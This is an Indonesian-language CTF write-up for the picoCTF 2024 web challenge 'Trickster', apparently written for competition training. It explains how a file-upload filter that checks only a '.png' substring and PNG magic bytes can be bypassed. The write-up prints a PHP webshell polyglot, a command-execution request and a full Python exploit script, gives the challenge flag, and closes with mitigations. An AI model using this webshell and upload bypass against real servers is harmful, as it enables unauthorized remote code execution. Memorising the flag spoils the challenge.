# 445 - Trickster (Web Exploitation, picoCTF 2024, Medium)

## Challenge Metadata
- ID: 445 | Event: picoCTF 2024 | Author: CyLab Academy
- Category: Web Exploitation | Difficulty: Medium (2) | Points: 200
- Flag: `academy{c3rt!fi3d_Xp3rt_tr1ckst3r_df3f5bef}`

## Problem Statement & Scope
Tantangan menyajikan aplikasi web pengolah gambar PNG. Halaman web memuat formulir unggah berkas (`multipart/form-data`) yang mengklaim hanya menerima gambar berformat PNG. Peserta ditantang untuk mengeksploitasi mekanisme validasi berkas guna memperoleh akses eksekusi kode jarak jauh (*Remote Code Execution* / RCE) dan mengambil flag dari server.

## Teori & Akar Kerentanan (Root Cause)
1. **Flawed File Extension Validation (Substring vs Extension):**
   Pemeriksaan berkas pada backend (terdokumentasi pada `instructions.txt`) hanya memeriksa apakah string nama berkas mengandung substring `.png` (`strpos($name, '.png') !== false`). Hal ini memungkinkan penyerang menyematkan ekstensi ganda seperti `payload.png.php`, yang valid menurut aturan substring namun tetap diperlakukan sebagai skrip PHP oleh modul web server Apache/PHP-FPM.
2. **Magic Bytes Content Sniffing Bypass:**
   Validasi tipe berkas hanya membaca byte-byte awal file untuk mencocokkan signature PNG (`\x89PNG\r\n\x1a\n` atau `50 4E 47`). Menambahkan header magic bytes PNG palsu di awal berkas teks PHP melewati filter pemeriksaan mime/magic bytes secara mulus.
3. **Penyimpanan Berkas Publik Tanpa Isolasi Eksekusi:**
   Berkas yang berhasil divalidasi disimpan di direktori `/uploads/` yang dapat diakses langsung oleh publik (`Disallow: /uploads/` pada `robots.txt`). Karena direktori ini tidak mematikan eksekusi PHP (`php_flag engine off` atau `SetHandler None`), skrip webshell dapat dieksekusi secara instan via peramban web.

## Rekonstruksi Eksploitasi Step-by-Step
1. **Reconnaissance Robots & Petunjuk:**
   - `robots.txt` mengungkap rute `/instructions.txt` dan `/uploads/`.
   - `/instructions.txt` menjelaskan persyaratan validasi: nama mengandung `.png` dan magic bytes PNG di awal file.
2. **Konstruksi Polyglot Webshell:**
   Menyusun payload biner yang memuat magic bytes PNG 8-byte diikuti kode PHP execution harness:
   ```php
   \x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>
   ```
3. **Unggah Berkas:**
   Mengirimkan multipart request dengan nama berkas `payload.png.php`. Server membalas:
   `File uploaded successfully and is a valid PNG file.`
4. **Eksekusi Perintah Sistem (RCE):**
   Mengakses URL endpoint:
   ```text
   GET /uploads/payload.png.php?cmd=cat%20/var/www/html/MRTDGZRVMJSWM.txt
   ```
   Server mengembalikan konten berkas rahasia:
   `/* academy{c3rt!fi3d_Xp3rt_tr1ckst3r_df3f5bef} */`

## Script Reproduksi & PoC
Implementasi otomasi Python lengkap tersedia pada `scripts/solve_445_trickster.py`:
```python
import urllib.request, urllib.parse, re

boundary = "----WebKitFormBoundaryXyZ123"
body = (
    f"--{boundary}\r\n"
    'Content-Disposition: form-data; name="file"; filename="payload.png.php"\r\n'
    "Content-Type: image/png\r\n\r\n"
).encode() + b'\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>\r\n' + f"--{boundary}--\r\n".encode()

req = urllib.request.Request("http://xebec.cylabacademy.net:39120/", data=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
urllib.request.urlopen(req, timeout=15)

shell_url = "http://xebec.cylabacademy.net:39120/uploads/payload.png.php?cmd=" + urllib.parse.quote("cat /var/www/html/MRTDGZRVMJSWM.txt")
flag = re.search(r"academy\{[^\}]+\}", urllib.request.urlopen(shell_url).read().decode(errors="replace")).group(0)
print("Flag:", flag)
```

## Mitigasi Defensif & Relevansi LKS Cyber Security
1. **Validasi Ekstensi yang Ketat (Strict Whitelisting):**
   Ekstrak ekstensi terakhir menggunakan `pathinfo($filename, PATHINFO_EXTENSION)` dan tolak ekstensi yang tidak termasuk dalam daftar putih (`['png', 'jpg', 'jpeg']`).
2. **Randomisasi Nama File & Nonaktifkan Eksekusi PHP di Folder Upload:**
   Simpan berkas dengan UUID acak tanpa ekstensi berbahaya. Tambahkan konfigurasi Apache `.htaccess` pada folder uploads:
   ```apache
   <FilesMatch ".*">
       SetHandler None
   </FilesMatch>
   ```
3. **Re-encoding Gambar:**
   Gunakan library grafis (seperti GD atau Imagick) untuk me-render ulang gambar dari nol sebelum disimpan ke disk, membuang semua kode injeksi dalam metadata atau payload trailing.
4. **Relevansi Modul LKS:**
   Materi ini menguji kemampuan evaluasi alur validasi upload file, bypass magic bytes, dan pengamanan direktori statis pada pengujian penetrasi web tingkat lanjutan.
